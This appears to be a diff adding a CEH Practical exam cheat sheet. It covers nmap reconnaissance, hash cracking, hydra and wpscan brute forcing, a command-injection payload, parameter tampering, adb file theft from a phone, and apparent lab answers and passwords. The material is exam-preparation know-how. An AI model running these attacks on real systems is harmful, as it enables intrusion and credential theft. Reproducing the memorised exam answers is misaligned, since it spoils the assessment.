@@ -1,0 +1,361 @@
+Enumeration & Reconnaissance
+
+Identify live machines on a subnet:
+
+nmap -sn 192.168.0.0/24
+
+
+
+Detect open ports:
+
+nmap -p- 192.168.0.X
+
+
+
+Find Domain Controller:
+
+nmap -p 389, 636, 88, 3268 192.168.0.0/24
+
+
+
+Get NetBIOS and FQDN:
+
+nmap -sC 192.168.0.X --top-ports=20
+
+
+
+Find OpenSSH version:
+
+nmap -p 22 192.168.0.0/24 --open -T5 -sV
+
+
+
+Detect OS:
+
+Step 1: nmap -p 3306 192.168.0.X --open
+
+Step 2: nmap -O 192.168.0.X -sV -T5
+
+
+
+LDAP Enumeration (user count):
+
+nmap 192.168.0.X --script=*user*
+
+
+
+Get LDAP version:
+
+ldapsearch -x -H ldap://192.168.0.X
+
+
+
+Service Discovery
+
+Check if NFS is enabled:
+
+nmap -p 111 192.168.0.0/24 --open
+
+
+
+DNS enumeration:
+
+nslookup -type=ns www.certifiedhacker.com
+
+
+
+Find SMTP service machine:
+
+nmap -p 25 192.168.0.0/24 --open -T5
+
+
+
+SMB enumeration (check message signing):
+
+nmap -p 445 192.168.0.X -sC -T5
+
+
+
+Password Attacks
+
+Crack NT hashes:
+
+john hashes.txt --format=NT --wordlist=password.txt
+
+
+
+Brute-force FTP:
+
+hydra -L Username.txt -P Passwords.txt 172.16.0.12 ftp 
+
+ftp 172.16.0.12 
+
+ftp> ls 
+
+ftp> mget * 
+
+cat flag.txt
+
+Use LophtCrack for password audit (GUI)
+
+
+
+File & Hash Extraction
+
+Upload and read file from DVWA:
+
+Access via: http://10.10.10.25:8080/DVWA
+
+Then use:
+
+type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+
+
+
+Decrypt hash using:
+
+
+
+https://hashes.com/en/decrypt/hash
+
+
+
+https://crackstation.net
+
+
+
+Steganography & Hidden Data
+
+Extract hidden text using Snow:
+
+snow.exe -C "C:\path\to\file.txt"
+
+
+
+Use OpenStego to extract from image
+
+
+
+Analyze .exe using BinText
+
+
+
+Analyze ELF binary:
+
+file Sample-ELF or use Ghidra
+
+
+
+Wireshark Challenges
+
+Filter HTTP POST leakage:
+
+http.request.method == POST
+
+
+
+Find data in UDP:
+
+Use filter udp, then inspect the payload
+
+
+
+Find ICMP ID:
+
+Use filter icmp
+
+
+
+Identify DoS source IP:
+
+Use: Statistics → Conversations
+
+
+
+Count attacking machines (DDoS):
+
+Look at Conversations tab (IPv4 tab)
+
+
+
+Detect session hijack protocol:
+
+Filter arp
+
+
+
+Check length of UDP data:
+
+Use filter udp
+
+
+
+Web & CMS Enumeration
+
+Find nginx version:
+
+whatweb www.example.com
+
+
+
+Check CMS used:
+
+whatweb / wig / wapalyzer
+
+
+
+Crawl for PNG files:
+
+curl http://example.com/ | grep .png | wc -l
+
+
+
+Find load balancer:
+
+lbd example.com or whatweb
+
+
+
+Parameter tampering:
+
+Try changing profile ID:
+
+movies.cehorg.com/viewprofile.aspx?id=1003
+
+→ Answer: linda
+
+
+
+Bruteforce WordPress login:
+
+wpscan --url http://cehorg.com/ -U adam -P /path/password.txt
+
+→ Found password: Orange1234
+
+
+
+Command Injection
+
+Command injection via web form:
+
+127.0.0.1 && net user
+
+→ Get user count (e.g., 8 users)
+
+
+
+Mobile Exploitation
+
+Use Phonesploit to capture screenshot:
+
+phonesploit.py 
+
+Connect to 172.16.0.21 
+
+Select option to pull screenshot: 
+
+sdcard/DCIM/capture.png
+
+
+
+Read files from mobile:
+
+adb shell 
+
+su root 
+
+cd sdcard/Download 
+
+cat confidential.txt 
+
+Audit APK (AntiMalwarescanner.apk) for permissions:
+
+Use: https://sisik.eu/apk-tool
+
+
+
+IoT & MQTT Analysis
+
+Analyze MQTT traffic:
+
+Wireshark → Filter mqtt
+
+Check line 49 or 201
+
+Topics: Fleet_Count, Data Bre@ch @lert
+
+
+
+Encryption Challenges
+
+Decrypt .aes file:
+
+Use AES Tool, password: qwerty
+
+
+
+Mount VeraCrypt volume:
+
+Password: test → Count files (e.g., 6)
+
+
+
+Decrypt hidden IP:
+
+Use BCTextEncoder → password: Pa$$w0rd
+
+→ Example output: 10.10.10.31
+
+
+
+Decrypt ransomware file (cryt-128–06encr.hex) using CrypTool:
+
+Algorithm: Twofish
+
+Hidden text: @!ph@|tE*t
+
+
+
+Footprinting
+
+Use https://www.ipvoid.com/ip-geolocation/
+
+→ Get latitude/longitude for IP
+
+
+
+Use https://shodan.io
+
+→ Check if IP relates to SCADA/ICS/IoT systems in the US
+
+
+
+Additional Useful Commands
+
+Windows service type check:
+
+(Get-Service -Name “afunix”).ServiceType
+
+
+
+DHCP Starvation (tcpdump):
+
+sudo tcpdump -i eth0 -v
+
+
+
+HTTP recon using telnet:
+
+telnet example.com 80 
+
+GET / HTTP/1.0
+
+
+
+
+https://sankalppatil12112001.medium.com/cracking-ceh-practical-exam-a-step-by-step-guide-1bc6a292921f
+https://medium.com/@akashaj1425/ceh-practical-2025-dbb8fef1e3d8
+https://medium.com/@sohailahmed0x0/ceh-practical-exam-passed-1f722b48a53e
+https://medium.com/certifications-exams/ceh-practical-certification-exam-guide-661cf82f452a
+https://medium.com/@NadeemKhadim/ceh-practical-exam-review-2023-2024-5e9417e7cfc1
+
